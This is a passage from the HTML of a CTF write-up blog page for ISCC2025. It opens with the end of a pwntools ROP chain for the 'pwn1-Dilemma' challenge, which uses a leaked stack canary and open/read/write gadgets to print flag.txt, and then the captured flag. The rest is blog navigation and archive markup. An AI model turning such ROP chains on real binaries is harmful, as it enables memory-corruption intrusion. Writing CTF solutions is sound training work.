class="string">b&#x27;./flag.txt&#x27;</span>.ljust(<span class="number">0x28</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">rop += p64(canary)</span><br><span class="line">rop += p64(ret)</span><br><span class="line">rop += p64(pop_rdi) + p64(bss)</span><br><span class="line">rop += p64(pop_rsi_r15) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(open_plt)</span><br><span class="line"></span><br><span class="line">rop += p64(pop_rdi) + p64(<span class="number">3</span>)</span><br><span class="line">rop += p64(pop_rsi_r15) + p64(bss + <span class="number">0x200</span>) + p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(pop_rdx_r12) + p64(<span class="number">0x50</span>) + p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(read_plt)</span><br><span class="line"></span><br><span class="line">rop += p64(pop_rdi) + p64(<span class="number">1</span>)</span><br><span class="line">rop += p64(pop_rsi_r15) + p64(bss + <span class="number">0x200</span>) + p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(pop_rdx_r12) + p64(<span class="number">0x50</span>) + p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(write_plt)</span><br><span class="line"></span><br><span class="line">p.send(rop)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#ISCC&#123;71daee4d-9026-46df-93e6-52d17b786114&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+    </article>
+    <!-- license -->
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://huajihd.github.io">Huaji</a>
+            <p>原文链接：<a href="http://huajihd.github.io/2025/05/18/ISCC-WP/">http://huajihd.github.io/2025/05/18/ISCC-WP/</a>
+            <p>发表日期：<a href="http://huajihd.github.io/2025/05/18/ISCC-WP/">May 18th 2025, 1:45:52 pm</a>
+            <p>更新日期：<a href="http://huajihd.github.io/2025/05/18/ISCC-WP/">July 7th 2025, 1:53:03 pm</a>
+            <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2025/07/02/Junior-Crypt-2025/" title="Junior.Crypt.2025 CTF">
+                    <div class="nextTitle">Junior.Crypt.2025 CTF</div>
+                </a>
+        </li>
+        <li class="previous">
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2025/04/20/UCSC-WP/" title="UCSC-WP">
+                    <div class="prevTitle">UCSC-WP</div>
+                </a>
+        </li>
+    </ul>
+    <!-- comment -->
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+            
+            
+            
+            <!-- utteranc评论 -->
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+            
+            
+            
+        </div>
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    <!-- Mathjax -->
+</main>
+
+                <!-- profile -->
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+        <div class="social">
+                            <a href="mailto:2185374541@qq.com" class="iconfont-archer email" title="email" ></a>
+                <a href="//github.com/HuajiHD" class="iconfont-archer github" target="_blank" title="github"></a>
+
+        </div>
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    <!-- 不蒜子  -->
+        <div class="busuanzi-container">
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+        </div>
+</footer>
+
+        </div>
+        <!-- toc -->
+            <div class="toc-wrapper toc-wrapper-loding" style=    top:50vh;
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ISCC2025-WP"><span class="toc-number">1.</span> <span class="toc-text">ISCC2025-WP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8C%BA%E5%9F%9F%E8%B5%9B"><span class="toc-number">2.</span> <span class="toc-text">区域赛</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web-%E5%93%AA%E5%90%92%E7%9A%84%E8%AF%95%E7%82%BC"><span class="toc-number">2.1.</span> <span class="toc-text">web-哪吒的试炼</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mobile-Detective"><span class="toc-number">2.2.</span> <span class="toc-text">mobile-Detective</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%BD%E8%B5%9B"><span class="toc-number">3.</span> <span class="toc-text">国赛</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web1"><span class="toc-number">3.1.</span> <span class="toc-text">web1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mobile1-GGAD"><span class="toc-number">3.2.</span> <span class="toc-text">mobile1-GGAD</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#reverse1-CrackMe"><span class="toc-number">3.2.1.</span> <span class="toc-text">reverse1-CrackMe</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reverse2-uglyCpp"><span class="toc-number">3.3.</span> <span class="toc-text">reverse2-uglyCpp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn1-Dilemma"><span class="toc-number">3.3.1.</span> <span class="toc-text">pwn1-Dilemma</span></a></li></ol></li></ol></li></ol>
+            </div>
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 21
+        </div>
+        <!-- search  -->
+    </div>
+    <div class="post-archive">
+            <div class="archive-year"> 2025 </div>
+            <ul class="year-list">
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/09</span>
+            <a class="archive-post-title" href="/2025/11/09/hello-world/">Hello World</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/09</span>
+            <a class="archive-post-title" href="/2025/11/09/Pikachu/">Pikachu</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/14</span>
+            <a class="archive-post-title" href="/2025/10/14/ycb2025-web/">羊城杯2025-web</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/07</span>
+            <a class="archive-post-title" href="/2025/10/07/bugkuawd-10-7/">bugku-awd小记10.7</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/11</span>
+            <a class="archive-post-title" href="/2025/08/11/fengshentai/">封神台2025</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/20</span>
+            <a class="archive-post-title" href="/2025/07/20/NewStar-CTF-2024-Web-Week2/">NewStar CTF 2024 Web Week2复现</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/20</span>
+            <a class="archive-post-title" href="/2025/07/20/NewStar-CTF-2024-Web-Week3/">NewStar CTF 2024 Web Week3复现</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span>
+            <a class="archive-post-title" href="/2025/07/18/NewStar-CTF-2024-Web-Week1/">NewStar CTF 2024 Web Week1复现</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/12</span>
+            <a class="archive-post-title" href="/2025/07/12/YWB2025-Final/">御网杯2025线下赛</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/06</span>
+            <a class="archive-post-title" href="/2025/07/06/BlitzCTF-WP/">BlitzCTF-WP</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/02</span>
+            <a class="archive-post-title" href="/2025/07/02/Junior-Crypt-2025/">Junior.Crypt.2025 CTF</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/18</span>
+            <a class="archive-post-title" href="/2025/05/18/ISCC-WP/">ISCC2025-WP</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/20</span>
+            <a class="archive-post-title" href="/2025/04/20/UCSC-WP/">UCSC-WP</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/06</span>
+            <a class="archive-post-title" href="/2025/04/06/XYCTF-WP/">XYCTF-WP</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/16</span>
+            <a class="archive-post-title" href="/2025/02/16/EHAX-WP/">EHAX_WP</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/27</span>
+            <a class="archive-post-title" href="/2025/01/27/TUCTF-WP/">TUCTF_WP</a>
+        </li>
+                </ul>
+            <div class="archive-year"> 2024 </div>
+            <ul class="year-list">
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/31</span>
+            <a class="archive-post-title" href="/2024/12/31/SQLByPass/">sql注入绕过技巧</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/25</span>
+            <a class="archive-post-title" href="/2024/12/25/vbsTestAutomation/">vbs自动化测试</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/06</span>
+            <a class="archive-post-title" href="/2024/12/06/ouc-rob-blue/">重生之我在牢山抢小蓝</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/27</span>
+            <a class="archive-post-title" href="/2024/11/27/oucBookSeminar/">研讨室预约填写信息自动化工具</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/27</span>
+            <a class="archive-post-title" href="/2024/10/27/oucAutoCheckIn/">ouc接龙管家自动晚打卡</a>
+        </li>
+            </ul>
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+            <span class="sidebar-tag-name" data-tags="ctf">
+                <span class="iconfont-archer">&#xe606;</span>
+                ctf
+            </span>
+            <span class="sidebar-tag-name" data-tags="writeup">
+                <span class="iconfont-archer">&#xe606;</span>
+                writeup
+            </span>
+            <span class="sidebar-tag-name" data-tags="web">
+                <span class="iconfont-archer">&#xe606;</span>
+                web
+            </span>
+            <span class="sidebar-tag-name" data-tags="python">
+                <span class="iconfont-archer">&#xe606;</span>
+                python
+            </span>
+            <span class="sidebar-tag-name" data-tags="requests">
+                <span class="iconfont-archer">&#xe606;</span>
+                requests
+            </span>
+            <span class="sidebar-tag-name" data-tags="青龙面板">
+                <span class="iconfont-archer">&#xe606;</span>
+                青龙面板
+            </span>
+            <span class="sidebar-tag-name" data-tags="debian">
+                <span class="iconfont-archer">&#xe606;</span>
+                debian
+            </span>
+            <span class="sidebar-tag-name" data-tags="selenium">
+                <span class="iconfont-archer">&#xe606;</span>
+                selenium
+            </span>
+            <span class="sidebar-tag-name" data-tags="javascript">
+                <span class="iconfont-archer">&#xe606;</span>
+                javascript
+            </span>
+            <span class="sidebar-tag-name" data-tags="js">
+                <span class="iconfont-archer">&#xe606;</span>
+                js
+            </span>
+            <span class="sidebar-tag-name" data-tags="vbs">
+                <span class="iconfont-archer">&#xe606;</span>
+                vbs
+            </span>
+            <span class="sidebar-tag-name" data-tags="-web">
+                <span class="iconfont-archer">&#xe606;</span>
+                -web
+            </span>
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "http://huajihd.github.io",
+        root: siteMetaRoot,
+        author: "Huaji"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+        <!-- main func -->
+        <script src="/scripts/main.js"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.umd.js" onload="window.Fancybox.bind('[data-fancybox]')" defer></script>
+        <!-- algolia -->
+        <!-- busuanzi -->
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        <!-- async load share.js -->
+            <script src="/scripts/share.js" async></script>
+        <!-- mermaid -->
+    </body>
+</html>
